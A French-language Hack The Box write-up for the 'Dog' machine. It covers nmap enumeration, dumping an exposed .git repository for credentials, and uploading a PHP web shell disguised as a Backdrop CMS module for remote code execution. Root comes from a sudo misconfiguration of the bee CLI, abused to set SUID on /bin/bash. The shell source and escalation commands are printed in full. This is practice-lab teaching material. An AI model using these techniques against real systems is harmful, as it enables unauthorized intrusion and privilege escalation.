---
title: Dog - Linux Easy - HTB Writeup 
description:
slug: Dog-htb-writeup-linux-easy
date: 2025-07-12 00:00:00+0000
image: Dog.png
categories:
    - Hack
    - Linux
    - Easy
tags:
    - GitHack
    - RCE
    - Sudo misconfiguration
# weight: 1       # You can add weight to some posts to override the default sorting (date descending)
---
## Résumé
User: Identifiants de l'app web dans le code source extrait via GitHack + RCE via l'upload d'une archive.\
Root: Misconfiguration sudo du CLI bee.

## Enumeration
A l'aide d'un scan nmap, nous pouvons identifier un service web sur le port 80 et SSH sur le port 22.

{{< highlight go "hl_lines=1 3 8 21" >}}
$ nmap -Pn -p- 10.129.208.97 -v -A
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.208.97:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
{{< /highlight >}}

## Utilisateur
### Dump git + RCE via shell.tar

Le scan nmap a souligné que le dossier `.git` de l'application web est exposé.\
Nous utilisons [GitHack](https://github.com/lijiejie/GitHack) afin d'obtenir une partie du code source.

{{< highlight go "hl_lines=1 4" >}}
$ ls
GitHack.py  index  lib  README.md
              
$ python GitHack.py http://dog.htb/.git
[+] Download and parse index file ...
[+] LICENSE.txt
[+] README.md
[+] core/.jshintignore
...

{{< /highlight >}}
Dans ces fichiers, nous pouvons trouver un username `tiffany` et un mot de passe `BackDropJ2024DS2024`
{{< highlight go "hl_lines=1 4" >}}
$ grep -ir dog.htb .
./dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"

$ cat -n settings.php
...
    15  $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
...
{{< /highlight >}}

Ces identifiants nous permettent de nous connecter à l'application web `http://dog.htb` en tant que `tiffany`.\
Nous pouvons trouver la version de `Backdrop` utilisée via l'onglet `Reports` puis `Status report`.\
Cette version `1.27.1` est vulnérable à une RCE.
![](Backdrop_version.png)

Cet [exploit](https://www.exploit-db.com/exploits/52021) pourrait fonctionner mais, notre instance de backdrop n'autorise pas l'installation de modules en utilisant des archives `.zip`.\
Nous pouvons trouver cette information via l'onget `Functionality` puis `Install new modules`.
![](Backdrop_zip.png)

Nous allons créer notre propre archive `.tar` en utilisant le code HTML/PHP et contenu de `shell.info` fournis dans l'exploit.\
Ensuite, sur la page d'installation des modules, nous uploadons notre archive.
{{< highlight go "hl_lines=1 19 36" >}}
$ cat shell.php   
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>

$ cat shell.info
type = module
name = Block
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662

$ tar cvf shell.tar shell.php shell.info
shell.php
shell.info
{{< /highlight >}}
![](Backdrop_shell_tar.png)
![](Backdrop_module_installed.png)

Même si notre nouveau module n'est pas listé dans la liste des modules de l'application web, nous pouvons y accéder via `/modules/shell/shell.php` comme spécifié dans l'[exploit](https://www.exploit-db.com/exploits/52021).
![](Backdrop_RCE.png)

Dans le dossier `/home`, on remarque deux utilisateurs `jobert` et `johncusack`.
![](Backdrop_users.png)\
En réutilisant le mot de passe `BackDropJ2024DS2024` précédemment trouvé, nous pouvons nous connecter à la machine via SSH en tant que `johncusack` et récupérer le flag `user.txt`.
{{< highlight go "hl_lines=1 2" >}}
$ ssh johncusack@dog.htb
johncusack@dog:~$ ls
user.txt
{{< /highlight >}}

## Root
### Misconfiguration sudo
On remarque que `johncusack` peut utiliser la CLI `bee` en tant que `root` grace à sudo.
{{< highlight go "hl_lines=1 7" >}}
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
{{< /highlight >}}
Cette CLI "permet aux developpeurs d'intérargir avec des sites Backdrop" comme spécifié sur leur [GitHub](https://github.com/backdrop-contrib/bee). Comme indiqué dans la documentation, nous pouvons éxécuter du code PHP.

{{< highlight go "hl_lines=1" >}}
johncusack@dog:~$ sudo bee
...
  eval
   ev, php-eval
        Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
...
{{< /highlight >}}

Premièrement, nous allons nous déplacer dans `/var/www/html` pour que `bee` puisse intérargir avec notre application backdrop.\
Ensuite, nous allons ajouter le flag SUID à `/bin/bash` afin d'obtenir un shell root et récupérer le flag `root.txt`.
{{< highlight go "hl_lines=2 5 6 8" >}}
johncusack@dog:~$ cd /var/www/html
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-eval 'exec("chmod u+s /bin/bash")'
johncusack@dog:/var/www/html$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
johncusack@dog:/var/www/html$ /bin/bash -p
bash-5.0# id
uid=1001(johncusack) gid=1001(johncusack) euid=0(root) groups=1001(johncusack)
bash-5.0# ls /root
root.txt
{{< /highlight >}}


## Ressources
> [GitHack](https://github.com/lijiejie/GitHack)\
> [Backdrop v1.27.1](https://www.exploit-db.com/exploits/52021)